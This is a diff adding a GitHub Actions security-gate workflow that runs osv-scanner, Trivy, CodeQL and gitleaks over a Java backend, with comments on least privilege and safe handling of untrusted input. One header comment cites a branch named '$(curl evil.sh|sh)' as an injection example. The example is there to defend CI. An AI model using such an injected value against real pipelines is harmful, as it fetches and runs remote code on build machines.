@@ -1,0 +1,1202 @@
+# The mandatory Security Gate for backend-foundation.
+#
+# CI (ci.yml) answers "does this build and pass its tests?". This workflow
+# answers a different question — "is it safe to merge and to ship?" — and it is
+# the only thing allowed to answer it. Both are required; neither substitutes
+# for the other.
+#
+# THE ONE RULE THIS FILE OBEYS: nothing in this YAML decides whether the gate
+# passes. Every scanner writes a report; the job named `Security Gate` hands
+# every report to .github/security/evaluate.py, and that script — reading
+# .github/security/policy.yml — makes the single pass/fail judgement. Keeping
+# the decision out of the workflow is what stops the enforcement from quietly
+# drifting away from the written policy. It is also why you will not find a
+# `--severity HIGH,CRITICAL` filter or an `|| true` anywhere below: a scanner
+# that hides its own findings, or swallows its own crash, has pre-empted the
+# policy.
+#
+# What that means in practice, and why each one is a rule rather than a habit:
+#
+#   * No `continue-on-error` and no `|| true` on anything that scans. A scanner
+#     that died is not a scanner that found nothing, and the difference has to
+#     survive all the way to the report.
+#   * Every scanner job writes reports/status/<id>.status as its LAST step.
+#     A job cannot know its own final conclusion, so the gate ALSO derives each
+#     status from `needs.<job>.result`, which is authoritative and which is the
+#     only thing that can report a job that was cancelled before it wrote
+#     anything. A missing status is treated as failure by evaluate.py.
+#   * Untrusted metadata — a PR title, a fork's branch name — is never
+#     interpolated into a `run:` block. It goes through `env:` and is quoted.
+#     A branch called `$(curl evil.sh|sh)` is a perfectly legal branch name.
+#
+# TRIGGERS
+#
+#   pull_request  — the merge-blocking assessment. `edited` is in the type list
+#                   because changing a PR's BASE BRANCH is reported as `edited`,
+#                   and a PR retargeted from develop to main has changed what it
+#                   is being merged into without pushing a commit.
+#   push          — records the assessed state of develop and main themselves,
+#                   so the branch has a verdict of its own and the deployment
+#                   gate has something to require.
+#   schedule      — the whole reason this is not just a pre-merge check. Nothing
+#                   about the code changes overnight; the advisory database
+#                   does. See the `targets` job for how this covers main as well
+#                   as develop.
+#   workflow_dispatch — a human, or deploy-production.yml, forcing a fresh
+#                   assessment of a specific ref the moment an advisory drops.
+#
+# NO MERGE QUEUE. `merge_group` is deliberately absent. Verified on 2026-09-09:
+# neither develop_branch_rule (id 15602849) nor main_release_rule (id 21330890)
+# configures a merge queue, and this repository has none. Adding a `merge_group`
+# trigger for a queue that does not exist would create a check context that can
+# never report, which is worse than absent. If a merge queue is ever enabled,
+# `merge_group` MUST be added here in the same change.
+
+name: Security
+
+on:
+  pull_request:
+    branches: [develop, main]
+    types: [opened, synchronize, reopened, ready_for_review, edited]
+  push:
+    branches: [develop, main]
+  schedule:
+    # 03:23 UTC daily. An odd minute rather than :00 — GitHub's scheduler is
+    # heavily contended on the hour and silently delays or drops runs there.
+    - cron: '23 3 * * *'
+  workflow_dispatch:
+
+# Least privilege at the top, and it is the FLOOR, not the ceiling: every job
+# below inherits exactly this unless it declares its own block. Two jobs need
+# more (CodeQL needs security-events: write to publish SARIF; dependency review
+# needs pull-requests: read). Nothing in this workflow gets contents: write —
+# a security scanner has no business writing to the repository it is judging.
+permissions:
+  contents: read
+
+# Supersede a PR run when the PR is pushed again; never cancel anything else.
+#
+# A develop/main push run is what the deployment gate later requires, and a
+# scheduled run is the only thing that catches an overnight advisory. Cancelling
+# either would silently destroy the evidence something else depends on. Keying
+# non-PR runs on github.run_id puts every one of them in a group of its own, so
+# `cancel-in-progress` has nothing to cancel even if it were true — which it is
+# not, because it is evaluated per event below.
+concurrency:
+  group: >-
+    security-${{ github.workflow }}-${{
+      github.event_name == 'pull_request'
+        && format('pr-{0}', github.event.pull_request.number)
+        || format('run-{0}', github.run_id)
+    }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+jobs:
+  # ---------------------------------------------------------------------------
+  # What is being assessed, and at exactly which commit
+  # ---------------------------------------------------------------------------
+  # Every scanner and the gate itself work from this job's output, so the whole
+  # run is pinned to a commit resolved ONCE. Without that, a push landing
+  # mid-run would leave half the reports describing one revision and half
+  # another, and the gate would record a verdict against a tree that never
+  # existed.
+  #
+  # It also solves the scheduled-scan problem. GitHub only ever runs `schedule`
+  # against the DEFAULT branch — there is no way to ask it to also run on main.
+  # A daily scan that covered develop and not main would leave the branch that
+  # is actually deployed unassessed. So on a schedule this job emits TWO
+  # targets, develop and main, each at its current head SHA, and every scanner
+  # below fans out over them.
+  targets:
+    name: Resolve assessment targets
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    outputs:
+      matrix: ${{ steps.plan.outputs.matrix }}
+      summary: ${{ steps.plan.outputs.summary }}
+    steps:
+      - name: Decide what this run assesses
+        id: plan
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          EVENT: ${{ github.event_name }}
+          REPO: ${{ github.repository }}
+          # Every one of these is attacker-influenced on a fork PR. They are
+          # read as environment values by a Python program that only ever puts
+          # them into a JSON string — never into a command line.
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          PR_BASE_SHA: ${{ github.event.pull_request.base.sha }}
+          EVENT_SHA: ${{ github.sha }}
+          EVENT_REF: ${{ github.ref_name }}
+          EVENT_GIT_REF: ${{ github.ref }}
+        run: |
+          set -euo pipefail
+          python3 - <<'PY' >> "$GITHUB_OUTPUT"
+          import json, os, subprocess, sys
+
+          event = os.environ["EVENT"]
+          repo = os.environ["REPO"]
+
+          def head_of(branch: str) -> str:
+              """Ask GitHub for a branch head. Never guessed, never cached."""
+              out = subprocess.run(
+                  ["gh", "api", f"repos/{repo}/commits/{branch}", "--jq", ".sha"],
+                  capture_output=True, text=True, timeout=60)
+              if out.returncode != 0 or not out.stdout.strip():
+                  print(f"::error::Could not resolve the head of '{branch}': "
+                        f"{out.stderr.strip()[:300]}", file=sys.stderr)
+                  raise SystemExit(1)
+              return out.stdout.strip()
+
+          targets = []
+          if event == "pull_request":
+              # The assessed revision is the PR HEAD commit, not the ephemeral
+              # merge commit. A merge commit's SHA does not survive the next
+              # push and cannot be recorded, required by the deployment gate, or
+              # looked up later. The cost of that choice is real and is written
+              # down in docs/security/SECURITY_CI.md: this assesses the branch,
+              # not the merge result, so a vulnerability introduced by the base
+              # branch since the PR forked is caught by the develop push scan
+              # and by the daily scan, not here.
+              targets.append({
+                  "name": f"PR #{os.environ['PR_NUMBER']} ({os.environ['PR_HEAD_REF']})",
+                  "ref": os.environ["PR_HEAD_REF"],
+                  "git_ref": f"refs/pull/{os.environ['PR_NUMBER']}/head",
+                  "sha": os.environ["PR_HEAD_SHA"],
+                  "base_sha": os.environ["PR_BASE_SHA"],
+              })
+          elif event == "schedule":
+              # Both protected branches, explicitly, at recorded revisions.
+              for branch in ("develop", "main"):
+                  targets.append({"name": branch, "ref": branch,
+                                  "git_ref": f"refs/heads/{branch}",
+                                  "sha": head_of(branch), "base_sha": ""})
+          else:
+              # push and workflow_dispatch: whatever ref triggered the run.
+              # deploy-production.yml dispatches this workflow against a release
+              # TAG, and github.sha is then the tagged commit — which is exactly
+              # the commit the deployment gate needs a verdict for. github.ref
+              # is already fully qualified, so a tag stays refs/tags/... rather
+              # than being mislabelled as a branch.
+              targets.append({"name": os.environ["EVENT_REF"],
+                              "ref": os.environ["EVENT_REF"],
+                              "git_ref": os.environ["EVENT_GIT_REF"],
+                              "sha": os.environ["EVENT_SHA"], "base_sha": ""})
+
+          for i, t in enumerate(targets):
+              t["slug"] = f"t{i}"
+
+          # Branch and tag names cannot contain a newline, so neither of these
+          # can break the key=value form GITHUB_OUTPUT expects.
+          print("matrix=" + json.dumps(targets, separators=(",", ":")))
+          print("summary=" + " | ".join(
+              f"{t['slug']}={t['name']}@{t['sha'][:12]}" for t in targets))
+          PY
+
+      - name: Show the plan
+        env:
+          PLAN: ${{ steps.plan.outputs.summary }}
+        run: |
+          {
+            echo "### Security assessment targets"
+            echo
+            echo '```'
+            printf '%s\n' "$PLAN"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+
+  # ---------------------------------------------------------------------------
+  # Vulnerability intelligence — fetched once, recorded, then consumed
+  # ---------------------------------------------------------------------------
+  # This job is what turns "the scan found nothing" into a claim with evidence
+  # behind it. refresh-intelligence.py fetches the OSV offline databases, the
+  # CISA KEV catalogue, Trivy's database revision and a GHSA reachability probe,
+  # and writes intelligence-manifest.json recording when each was retrieved and
+  # at which upstream revision. If a mandatory source cannot be reached it exits
+  # non-zero, every scanner job is skipped, and the gate reports "could not be
+  # evaluated" — never "clean".
+  #
+  # The SBOM has to exist before the intelligence refresh, because osv-scanner
+  # only downloads the databases for ecosystems it can see in the inventory it
+  # is given. It is also the authoritative inventory for the whole gate:
+  # pom.xml alone resolves 19 packages, the aggregate CycloneDX BOM resolves
+  # 142, and it is the transitive 142 that carry the risk.
+  intelligence:
+    name: Refresh vulnerability intelligence
+    needs: targets
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    strategy:
+      fail-fast: false
+      matrix:
+        target: ${{ fromJSON(needs.targets.outputs.matrix) }}
+    steps:
+      - name: Check out the assessed revision
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ matrix.target.sha }}
+          persist-credentials: false
+
+      - name: Set up JDK
+        uses: actions/setup-java@dd06d9cba3e5552c54d9f8ea23572deb30010f7c # v6.0.0
+        with:
+          java-version: '25'
+          distribution: 'temurin'
+          cache: 'maven'
+
+      - name: Install the pinned scanner binaries
+        run: .github/security/install-scanners.sh "${RUNNER_TEMP}/security-tools"
+
+      - name: Put the scanners on PATH
+        run: echo "${RUNNER_TEMP}/security-tools" >> "$GITHUB_PATH"
+
+      # The CycloneDX plugin is invoked as a CLI goal at a pinned version, so
+      # pom.xml is NOT modified to add a build plugin. The dependency inventory
+      # the security pipeline reads therefore cannot be changed by editing the
+      # build — which is the point.
+      #
+      # The `.cdx.json` suffix is REQUIRED, not cosmetic: osv-scanner identifies
+      # an SBOM by filename and silently refuses anything else.
+      - name: Generate the CycloneDX SBOM
+        run: |
+          set -euo pipefail
+          ./mvnw -B -ntp org.cyclonedx:cyclonedx-maven-plugin:2.9.1:makeAggregateBom \
+            -DoutputFormat=json -DoutputName=sbom.cdx -DincludeTestScope=false
+          test -s target/sbom.cdx.json
+          python3 - <<'PY'
+          import json
+          doc = json.load(open("target/sbom.cdx.json"))
+          n = len(doc.get("components") or [])
+          print(f"SBOM components: {n}")
+          # A BOM that resolved almost nothing means the build failed quietly
+          # and the whole dependency scan would then be scanning an empty tree.
+          if n < 20:
+              raise SystemExit(f"::error::Only {n} components resolved; the SBOM is not credible.")
+          PY
+
+      - name: Refresh and record vulnerability intelligence
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          python3 .github/security/refresh-intelligence.py \
+            --out intel \
+            --ecosystems maven \
+            --probe-file target/sbom.cdx.json \
+            --repository "$REPO"
+
+      - name: Upload the intelligence snapshot
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: intel-${{ matrix.target.slug }}
+          path: intel/
+          retention-days: 30
+          if-no-files-found: error
+
+      # The inventory is published in its own right. It is the answer to "what
+      # was actually in this build?", which is the first question asked when an
+      # advisory lands, and it should not require re-running a pipeline.
+      - name: Upload the SBOM as the release inventory
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: sbom-${{ matrix.target.slug }}
+          path: target/sbom.cdx.json
+          retention-days: 90
+          if-no-files-found: error
+
+  # ---------------------------------------------------------------------------
+  # deps-osv — dependency vulnerabilities, against the recorded OSV snapshot
+  # ---------------------------------------------------------------------------
+  deps-osv:
+    name: Dependencies (osv-scanner)
+    needs: [targets, intelligence]
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    strategy:
+      fail-fast: false
+      matrix:
+        target: ${{ fromJSON(needs.targets.outputs.matrix) }}
+    steps:
+      - name: Check out the assessed revision
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ matrix.target.sha }}
+          persist-credentials: false
+
+      - name: Install osv-scanner
+        run: |
+          .github/security/install-scanners.sh "${RUNNER_TEMP}/security-tools" osv-scanner
+          echo "${RUNNER_TEMP}/security-tools" >> "$GITHUB_PATH"
+
+      - name: Download the recorded intelligence snapshot
+        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0
+        with:
+          name: intel-${{ matrix.target.slug }}
+          path: intel
+
+      - name: Download the SBOM
+        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0
+        with:
+          name: sbom-${{ matrix.target.slug }}
+          path: sbom
+
+      # --offline-vulnerabilities, NOT --download-offline-databases.
+      #
+      # The distinction is the whole point of the intelligence job. With
+      # --download-offline-databases this step would fetch its own copy of the
+      # OSV database, and the freshness the manifest recorded would describe a
+      # different download than the one that produced this report. Pointing
+      # OSV_SCANNER_LOCAL_DB_CACHE_DIRECTORY at the snapshot and forbidding any
+      # further download makes the report provably a product of the recorded
+      # data. If the snapshot is not there, the scan fails — it does not quietly
+      # scan against nothing.
+      - name: Scan the SBOM against the recorded OSV database
+        env:
+          OSV_SCANNER_LOCAL_DB_CACHE_DIRECTORY: ${{ github.workspace }}/intel/osv-db
+        run: |
+          set -euo pipefail
+          mkdir -p reports/status
+          test -d "$OSV_SCANNER_LOCAL_DB_CACHE_DIRECTORY"
+
+          # osv-scanner EXITS 1 WHEN IT FINDS VULNERABILITIES. That is a
+          # successful scan reporting bad news, not a broken scanner, and
+          # conflating the two is how a real finding becomes a red herring —
+          # or, with `|| true`, how a real crash becomes a green check. So the
+          # two are separated explicitly: 0 and 1 are scans, anything else is a
+          # failure of the scanner itself and fails this job.
+          set +e
+          osv-scanner scan source \
+            --sbom=sbom/sbom.cdx.json \
+            --offline-vulnerabilities \
+            --format=json \
+            --output=reports/deps-osv.osv.json
+          rc=$?
+          set -e
+
+          case "$rc" in
+            0) echo "osv-scanner completed: nothing matched." ;;
+            1) echo "osv-scanner completed: vulnerabilities found. The gate judges the report, not this exit code." ;;
+            *) echo "::error::osv-scanner exited $rc — that is a scanner failure, not a finding."
+               exit "$rc" ;;
+          esac
+
+          # A scan that produced no file has not cleared anything either.
+          test -s reports/deps-osv.osv.json
+
+      - name: Record this job's status
+        if: always()
+        run: |
+          mkdir -p reports/status
+          printf '%s\n' "${{ job.status }}" > reports/status/deps-osv.status
+
+      - name: Upload the report
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: report-${{ matrix.target.slug }}-deps-osv
+          path: reports/
+          retention-days: 30
+          if-no-files-found: error
+
+  # ---------------------------------------------------------------------------
+  # deps-trivy — the independent second opinion on the same dependencies
+  # ---------------------------------------------------------------------------
+  # Not redundancy for its own sake. OSV and Trivy ingest overlapping but
+  # different upstreams, and a finding that only one of them carries is exactly
+  # the finding a single-scanner pipeline misses.
+  deps-trivy:
+    name: Dependencies (Trivy)
+    needs: targets
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    strategy:
+      fail-fast: false
+      matrix:
+        target: ${{ fromJSON(needs.targets.outputs.matrix) }}
+    steps:
+      - name: Check out the assessed revision
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ matrix.target.sha }}
+          persist-credentials: false
+
+      - name: Install Trivy
+        run: |
+          .github/security/install-scanners.sh "${RUNNER_TEMP}/security-tools" trivy
+          echo "${RUNNER_TEMP}/security-tools" >> "$GITHUB_PATH"
+
+      # Trivy ships its own OCI-distributed database and cannot be pointed at
+      # the OSV snapshot the intelligence job recorded, so it fetches its own
+      # and then WRITES BACK the revision it actually holds. evaluate.py holds
+      # that revision to the same freshness window as everything else, and
+      # fails the gate if the fragment is missing — so a Trivy job cannot scan
+      # against an unknown database and still report clean.
+      #
+      # The database is deliberately NOT cached between runs. A cached Trivy DB
+      # is the precise mechanism by which "fresh" becomes a lie: the job would
+      # get faster and the freshness claim would get weaker.
+      - name: Fetch the Trivy database and record its revision
+        run: |
+          set -euo pipefail
+          mkdir -p reports/status reports/intel
+          trivy image --download-db-only
+          trivy version --format json > reports/intel/deps-trivy.trivydb.json
+          cat reports/intel/deps-trivy.trivydb.json
+
+      # `--exit-code` is not set, so Trivy returns 0 whether or not it finds
+      # anything and ANY non-zero exit is a genuine scanner failure that fails
+      # this job. target/ is excluded because it is build output that is absent
+      # from a clean checkout — including it would make the result depend on
+      # whether someone had built locally. What is inside the built artefact is
+      # covered by image-trivy, against the real image.
+      - name: Scan dependencies
+        run: |
+          set -euo pipefail
+          trivy fs . \
+            --scanners vuln \
+            --skip-dirs target \
+            --format json \
+            --output reports/deps-trivy.trivy.json
+          test -s reports/deps-trivy.trivy.json
+
+      - name: Record this job's status
+        if: always()
+        run: |
+          mkdir -p reports/status
+          printf '%s\n' "${{ job.status }}" > reports/status/deps-trivy.status
+
+      - name: Upload the report
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: report-${{ matrix.target.slug }}-deps-trivy
+          path: reports/
+          retention-days: 30
+          if-no-files-found: error
+
+  # ---------------------------------------------------------------------------
+  # config-trivy — infrastructure-as-code misconfiguration
+  # ---------------------------------------------------------------------------
+  config-trivy:
+    name: Configuration (Trivy)
+    needs: targets
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    strategy:
+      fail-fast: false
+      matrix:
+        target: ${{ fromJSON(needs.targets.outputs.matrix) }}
+    steps:
+      - name: Check out the assessed revision
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ matrix.target.sha }}
+          persist-credentials: false
+
+      - name: Install Trivy
+        run: |
+          .github/security/install-scanners.sh "${RUNNER_TEMP}/security-tools" trivy
+          echo "${RUNNER_TEMP}/security-tools" >> "$GITHUB_PATH"
+
+      # A config scan uses the checks bundle, not the vulnerability database —
+      # but evaluate.py requires a database-revision fragment from EVERY Trivy
+      # job, on purpose. A job that cannot say which data it used is a job whose
+      # clean result cannot be relied on, and carving out an exception here
+      # would be the first crack in that rule.
+      - name: Fetch the Trivy database and record its revision
+        run: |
+          set -euo pipefail
+          mkdir -p reports/status reports/intel
+          trivy image --download-db-only
+          trivy version --format json > reports/intel/config-trivy.trivydb.json
+
+      # Scanned from the repository root, so the Dockerfile, docker-compose.yml
+      # and .github/workflows are all inside the scanned tree.
+      #
+      # Be clear about what that does and does not buy: Trivy 0.74.0's
+      # misconfiguration adapters are azure-arm, cloudformation, dockerfile,
+      # helm, kubernetes, terraform and ansible. On this repository it therefore
+      # ADAPTS ONE FILE — the Dockerfile — and the Compose file and the workflow
+      # YAML are walked but not evaluated against any rule set. Pointing it at
+      # the root is still right (a Compose or Actions adapter arriving upstream
+      # starts working with no change here), but the gap is real and is written
+      # down in docs/security/SECURITY_CI.md rather than papered over.
+      - name: Scan configuration
+        run: |
+          set -euo pipefail
+          trivy config . \
+            --format json \
+            --output reports/config-trivy.trivy.json
+          test -s reports/config-trivy.trivy.json
+          python3 - <<'PY'
+          import json
+          doc = json.load(open("reports/config-trivy.trivy.json"))
+          for r in doc.get("Results") or []:
+              s = r.get("MisconfSummary") or {}
+              print(f"{r.get('Target')} [{r.get('Type')}] "
+                    f"failures={s.get('Failures')} successes={s.get('Successes')}")
+          PY
+
+      - name: Record this job's status
+        if: always()
+        run: |
+          mkdir -p reports/status
+          printf '%s\n' "${{ job.status }}" > reports/status/config-trivy.status
+
+      - name: Upload the report
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: report-${{ matrix.target.slug }}-config-trivy
+          path: reports/
+          retention-days: 30
+          if-no-files-found: error
+
+  # ---------------------------------------------------------------------------
+  # image-trivy — the artefact that actually runs in production
+  # ---------------------------------------------------------------------------
+  # Scanning source dependencies misses everything the base image brings: the
+  # Alpine packages, the JRE, anything the Dockerfile installs. This is the only
+  # job that sees the thing that is actually deployed.
+  #
+  # The image is BUILT AND DISCARDED. push: false, load: true, and no registry
+  # credentials anywhere in this job — this workflow runs on pull requests,
+  # including from forks, and a job that can push an image is a job a PR can use
+  # to publish one. The released image is scanned separately, by digest, in
+  # deploy-production.yml, immediately before it ships.
+  image-trivy:
+    name: Container image (Trivy)
+    needs: targets
+    runs-on: ubuntu-latest
+    timeout-minutes: 35
+    strategy:
+      fail-fast: false
+      matrix:
+        target: ${{ fromJSON(needs.targets.outputs.matrix) }}
+    steps:
+      - name: Check out the assessed revision
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ matrix.target.sha }}
+          persist-credentials: false
+
+      - name: Install Trivy
+        run: |
+          .github/security/install-scanners.sh "${RUNNER_TEMP}/security-tools" trivy
+          echo "${RUNNER_TEMP}/security-tools" >> "$GITHUB_PATH"
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e # v4.3.0
+
+      - name: Build the image locally
+        uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
+        with:
+          context: .
+          push: false
+          load: true
+          tags: backend-foundation:security-scan
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+      - name: Fetch the Trivy database and record its revision
+        run: |
+          set -euo pipefail
+          mkdir -p reports/status reports/intel
+          trivy image --download-db-only
+          trivy version --format json > reports/intel/image-trivy.trivydb.json
+
+      - name: Scan the built image
+        run: |
+          set -euo pipefail
+          trivy image backend-foundation:security-scan \
+            --scanners vuln \
+            --format json \
+            --output reports/image-trivy.trivy.json
+          test -s reports/image-trivy.trivy.json
+
+      - name: Record this job's status
+        if: always()
+        run: |
+          mkdir -p reports/status
+          printf '%s\n' "${{ job.status }}" > reports/status/image-trivy.status
+
+      - name: Upload the report
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: report-${{ matrix.target.slug }}-image-trivy
+          path: reports/
+          retention-days: 30
+          if-no-files-found: error
+
+  # ---------------------------------------------------------------------------
+  # sast-codeql — the repository's own code
+  # ---------------------------------------------------------------------------
+  # Everything else here asks "is anything we depend on known-vulnerable?".
+  # This is the only job that asks whether the code Manara wrote is.
+  sast-codeql:
+    name: Static analysis (CodeQL)
+    needs: targets
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    permissions:
+      contents: read
+      # The ONE extra scope this job gets, and only so the SARIF can be
+      # published to the Code scanning tab. It is publication, not enforcement:
+      # see the two-step analyse/upload split below.
+      security-events: write
+    strategy:
+      fail-fast: false
+      matrix:
+        target: ${{ fromJSON(needs.targets.outputs.matrix) }}
+    steps:
+      - name: Check out the assessed revision
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ matrix.target.sha }}
+          persist-credentials: false
+
+      - name: Set up JDK
+        uses: actions/setup-java@dd06d9cba3e5552c54d9f8ea23572deb30010f7c # v6.0.0
+        with:
+          java-version: '25'
+          distribution: 'temurin'
+          cache: 'maven'
+
+      - name: Initialise CodeQL
+        uses: github/codeql-action/init@486fec2a3ea2626afcd8c7e9208b4f515078dd7e # codeql-bundle-v2.26.4
+        with:
+          languages: java-kotlin
+          # Manual rather than autobuild. Autobuild guesses at a build, and a
+          # guess that compiles a subset of the sources produces a database that
+          # analyses cleanly for the worst possible reason. This runs the same
+          # Maven Wrapper build CI runs.
+          build-mode: manual
+          queries: security-extended
+
+      - name: Build for analysis
+        run: ./mvnw -B -ntp -DskipTests package
+
+      # Analysis and publication are SEPARATE STEPS, deliberately.
+      #
+      # With `upload: always` the analyse step fails if the SARIF cannot be
+      # posted to code scanning — a GitHub outage, or the feature being turned
+      # off — and the gate would then block for a reason that has nothing to do
+      # with the code. Worse, the inverse mistake (wrapping the whole thing in
+      # continue-on-error) would let a genuine analysis failure pass silently.
+      #
+      # So: analysing MUST succeed and is what the gate reads, from the SARIF on
+      # disk. Uploading is best-effort and cannot mask anything.
+      - name: Analyse
+        uses: github/codeql-action/analyze@486fec2a3ea2626afcd8c7e9208b4f515078dd7e # codeql-bundle-v2.26.4
+        with:
+          category: /language:java-kotlin
+          output: codeql-results
+          upload: never
+
+      - name: Collect the SARIF for the gate
+        run: |
+          set -euo pipefail
+          mkdir -p reports/status
+          # Only the security SARIF. CodeQL also emits *.quality.sarif for its
+          # code-quality queries, and a maintainability warning is not a reason
+          # to block a merge.
+          test -s codeql-results/java-kotlin.sarif
+          cp codeql-results/java-kotlin.sarif reports/sast-codeql.sarif
+          python3 - <<'PY'
+          import json
+          doc = json.load(open("reports/sast-codeql.sarif"))
+          n = sum(len(r.get("results") or []) for r in doc.get("runs") or [])
+          print(f"CodeQL results in SARIF: {n}")
+          PY
+
+      - name: Publish the SARIF to code scanning (best effort)
+        if: always()
+        continue-on-error: true
+        uses: github/codeql-action/upload-sarif@486fec2a3ea2626afcd8c7e9208b4f515078dd7e # codeql-bundle-v2.26.4
+        with:
+          sarif_file: codeql-results
+          category: /language:java-kotlin
+          # ref and sha are passed explicitly because on a scheduled run this
+          # workflow executes on develop while one matrix leg is assessing main.
+          # Letting the action infer the ref would file main's results against
+          # develop, which is worse than not publishing them at all.
+          ref: ${{ matrix.target.git_ref }}
+          sha: ${{ matrix.target.sha }}
+
+      - name: Record this job's status
+        if: always()
+        run: |
+          mkdir -p reports/status
+          printf '%s\n' "${{ job.status }}" > reports/status/sast-codeql.status
+
+      - name: Upload the report
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: report-${{ matrix.target.slug }}-sast-codeql
+          path: reports/
+          retention-days: 30
+          if-no-files-found: error
+
+  # ---------------------------------------------------------------------------
+  # secrets-gitleaks — credentials in the repository and in the PR's commits
+  # ---------------------------------------------------------------------------
+  secrets-gitleaks:
+    name: Secrets (gitleaks)
+    needs: targets
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    strategy:
+      fail-fast: false
+      matrix:
+        target: ${{ fromJSON(needs.targets.outputs.matrix) }}
+    steps:
+      # fetch-depth: 0 because `gitleaks git` reads commits, not the working
+      # tree, and a shallow clone would silently scan almost nothing.
+      - name: Check out the assessed revision with full history
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ matrix.target.sha }}
+          fetch-depth: 0
+          persist-credentials: false
+
+      - name: Install gitleaks
+        run: |
+          .github/security/install-scanners.sh "${RUNNER_TEMP}/security-tools" gitleaks
+          echo "${RUNNER_TEMP}/security-tools" >> "$GITHUB_PATH"
+
+      # `gitleaks git`, NOT `gitleaks dir`.
+      #
+      # This is not a style preference. `gitleaks dir` walks the WORKING TREE,
+      # which includes files git has been told to ignore. Verified on 2026-09-09
+      # against this repository: it read the untracked, gitignored local
+      # application-local.properties — a developer's own machine-local
+      # credentials file that is not in the repository and never will be — and
+      # reported it as a leak. A gate that fails on files that are not in the
+      # repository trains people to ignore it, which is worse than not having
+      # one. `gitleaks git` reads commits, so it sees exactly what was committed
+      # and nothing else.
+      #
+      # --exit-code 0 makes "leaks found" a zero exit, so ANY non-zero exit is a
+      # gitleaks failure and fails this job. The findings themselves are judged
+      # by the gate, from the report. --redact keeps matched secret values out
+      # of the log and out of the report; nothing below ever echoes a match.
+      - name: Scan the commit history
+        run: |
+          set -euo pipefail
+          mkdir -p reports/status
+          gitleaks git . \
+            --redact \
+            --exit-code 0 \
+            --report-format json \
+            --report-path reports/secrets-gitleaks.gitleaks.json
+          test -f reports/secrets-gitleaks.gitleaks.json
+
+      # On a pull request the PR's own commit range is scanned a second time and
+      # written as a separate report. evaluate.py ingests every file matching
+      # the report id, so both land in the verdict.
+      #
+      # The full-history scan above already covers these commits. This exists
+      # because it is the range a reviewer is actually being asked to approve,
+      # and because it fails loudly if the base commit is not present rather
+      # than quietly scanning an empty range — the failure mode that makes a
+      # range scan worthless.
+      - name: Scan the pull request commit range
+        if: github.event_name == 'pull_request'
+        env:
+          BASE_SHA: ${{ matrix.target.base_sha }}
+          HEAD_SHA: ${{ matrix.target.sha }}
+        run: |
+          set -euo pipefail
+          if ! git cat-file -e "${BASE_SHA}^{commit}" 2>/dev/null; then
+            git fetch --no-tags --depth=200 origin "$BASE_SHA"
+          fi
+          if ! git cat-file -e "${BASE_SHA}^{commit}" 2>/dev/null; then
+            echo "::error::Base commit $BASE_SHA is not available, so the PR range cannot be scanned."
+            exit 1
+          fi
+          # --log-opts is built from two SHAs that GitHub itself supplied and
+          # that are validated as commits above. They are passed through the
+          # environment and quoted; nothing here is shell-interpolated from
+          # workflow context.
+          gitleaks git . \
+            --redact \
+            --exit-code 0 \
+            --log-opts="${BASE_SHA}..${HEAD_SHA}" \
+            --report-format json \
+            --report-path reports/secrets-gitleaks.range.gitleaks.json
+          test -f reports/secrets-gitleaks.range.gitleaks.json
+
+      - name: Record this job's status
+        if: always()
+        run: |
+          mkdir -p reports/status
+          printf '%s\n' "${{ job.status }}" > reports/status/secrets-gitleaks.status
+
+      - name: Upload the report
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: report-${{ matrix.target.slug }}-secrets-gitleaks
+          path: reports/
+          retention-days: 30
+          if-no-files-found: error
+
